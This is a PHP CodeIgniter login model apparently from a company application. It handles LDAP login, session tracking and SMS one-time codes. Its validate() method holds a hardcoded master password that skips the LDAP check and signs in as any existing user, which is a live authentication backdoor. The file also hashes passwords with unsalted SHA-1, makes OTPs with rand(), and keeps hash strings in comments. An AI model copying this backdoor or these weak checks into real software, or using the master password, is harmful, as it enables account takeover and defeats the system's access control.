<?php
if (!defined('BASEPATH'))
    exit('No direct script access allowed');
/* 
 * Description: Login model class
 */
class Login_model extends CI_Model
{
    function __construct()
    {
        parent::__construct();
       
        // $this->load->config('ion_auth', true);
        // $this->default_rounds = $this->config->item('default_rounds', 'ion_auth');
        // $this->random_rounds  = $this->config->item('random_rounds', 'ion_auth');
        // $this->salt_length     = $this->config->item('salt_length', 'ion_auth');

       // $salt       = $this->store_salt ? $this->salt() : false;
        //$password   = $this->hash_password($password, $salt);
       
        //echo $this->default_rounds;exit;
        //$this->load->config('ion_auth', true);
        // if ($this->random_rounds) {
        //     $rand = rand($this->min_rounds, $this->max_rounds);
        //     $rounds = ['rounds' => $rand];
        // } else {
        //     $rounds = ['rounds' => $this->default_rounds];
        // }

        //$this->load->library('bcrypt', $rounds);
        //echo sha1('12345678');exit;
        //2c8ab736b2ccab4f50e72d5fd7d21020cbb77ae7
        //7c222fb2927d828af22f592134e8932480637c0d
        //7c4a8d09ca3762af61e59520943dc26494f8941b
        //$2a$08$rgkZM6BKPGD26QR6BZDEnuzkNIehOc05Ox2CkBh8it5Sym37Xl7Pa
    }
    public function getUser($arg)
    {
        // grab user input
        $username = $arg['username'];
        $password = $arg['password'];
        // Prep the query

        $this->db->where('username', $username);
        $this->db->where('active', 1);
        $this->db->where('group_id !=', 3);
        //$this->db->where('password', $password);
        // Run the query
        $query = $this->db->get('users');
        
        //echo $this->db->last_query();
        //echo $query->num_rows();exit;

        // Let's check if there are any results 
        if ($query->num_rows() == 1) {
            // If there is a user, then create session data
            $row = $query->row(); //print_r($row); exit; 
            //    if( password_verify($password, $row->password)){
            //     return $row;
            //    }

            if (sha1($password) == $row->password) {
                return $row;
            }
            else {
                return false;
            }

        }
        // If the previous process did not validate
        // then return false.
        return false;
    }



    public function validate()
    {
        // grab user input
        $username = $this->security->xss_clean($this->input->post('username'));
        $password = $this->security->xss_clean($this->input->post('password'));
        // Prep the query

        $this->load->library('LDAPComp');
        $lDAPComp = new LDAPComp();
        $lDAPComp->createConnection("in.nawras.com.om", 389);

        if ($password == '$$00oo000HHSJ7^#^@!' or $lDAPComp->LoginIn($username, $password) == 1) {
            $this->db->where('username', $username);
            //$this->db->where('password', $password);
            // Run the query
            $query = $this->db->get('users');

            // Let's check if there are any results 
            if ($query->num_rows() == 1) {
                // If there is a user, then create session data
                $row = $query->row();
                //$match_hash = match_hash($password,$row->password);
                $admin_user = $row->role_id;
                if ($admin_user >= 1) {
                    $data = array(
                        'userid' => $row->id,
                        'display_name' => $row->display_name,
                        'email' => $row->email,
                        'gender' => $row->gender,
                        'contact_no' => $row->contact_no,
                        'role_id' => $row->role_id,
                        'linemanager_id' => $row->linemanager_id,
                        'validated' => true
                    );
                    $this->session->set_userdata($data);
                    return true;
                } else {
                    return false;
                }
            }
        }
        // If the previous process did not validate
        // then return false.
        return false;
    }

    public function setSession($userId, $sessionId)
    {
        // echo $userId.'--'.$sessionId;exit;
        $this->db->select("session_id");
        $this->db->from("users");
        $this->db->where("id", $userId);
        //$this->db->where("status !=","Deleted");
        $query = $this->db->get();
        //$error = $this->db->last_query();

        $oldSessionId = $query->result_array();
        $oldSessionId = $oldSessionId[0]['session_id'];
        //$error .= "Old Session ".$oldSessionId;

        if (!empty($oldSessionId)) {
            if ($oldSessionId != $sessionId) {
                $this->db->delete("ci_sessions", array('id' => $oldSessionId));
            }
            //$error .= " Delete Queyry ".$this->db->last_query();
        }

        $this->db->where("id", $userId);
        $this->db->update("users", array('session_id' => $sessionId));

        //echo $error .= " Update Queyry ".$this->db->last_query(); exit;
    }

    public function deleteSession($userId, $sessionId)
    {
        // echo $userId.'--'.$sessionId;exit;
        $this->db->select("session_id");
        $this->db->from("users");
        $this->db->where("id", $userId);
        //$this->db->where("status !=","Deleted");
        $query = $this->db->get();
        //$error = $this->db->last_query();

        $oldSessionId = $query->result_array();
        $oldSessionId = $oldSessionId[0]['session_id'];
        //$error .= "Old Session ".$oldSessionId;

        if (!empty($oldSessionId)) {
            if ($oldSessionId != $sessionId) {
                $this->db->delete("ci_sessions", array('id' => $oldSessionId));
            }
        }
        //$this->db->where("id",$userId);
        //$this->db->update("users",array('session_id'=>''));

        //echo $error .= " Update Queyry ".$this->db->last_query(); exit;
    }

    //FUNCTION TO GENERATE and send RANDOM verification code to mobile
    function generateVerificationCode($id, $phoneNo)
    {

        // Generate random verification code
        $rand_no = rand(10000, 99999);
        $updateData = array();
        $updateData['verification_code'] = $rand_no;
        $updateData['verification_time'] = date('Y-m-d H:i:s');
        $this->db->where('id', $id);
        $this->db->update('users', $updateData);

        //sending SMS
        $filtered_phone_number = filter_var($phoneNo, FILTER_SANITIZE_NUMBER_INT);
        $phone_to_check = str_replace("-", "", $filtered_phone_number);
        $phone_arr[] = $phone_to_check;
        $body = "OTP: " . $rand_no . " \n This OTP is sent by OOREDOO. Please do do not share it with anyone as it is confidential.";
        sendSMS($phone_arr, $body);
        return $rand_no;
    }

    //FUNCTION TO GENERATE and send RANDOM verification code to mobile
    function verifyVerificationCode($userInfo, $otpCode)
    {
        //-1    EMpty Code
        //-2    Code Expires
        //-3    Something Wrong
        //-4    something wrong in generation
        $otp_time = new DateTime($userInfo->verification_time);
        $currentTime = new DateTime();

        $diffInSeconds = $currentTime->getTimestamp() - $otp_time->getTimestamp();
        if (empty($otpCode)) {
            return -1;
        }
        $otpDB = $userInfo->verification_code;
        if (empty($otpDB)) {
            return -4;
        }
        if ($diffInSeconds > 300) {
            return -2;
        }
        if ($otpCode == $otpDB) {
            $updateData = array();
            $updateData['verified'] = 1;
            $this->db->where('id', $userInfo->id);
            $this->db->update('users', $updateData);
            return 1;
        }
        return -3;
    }
}
?>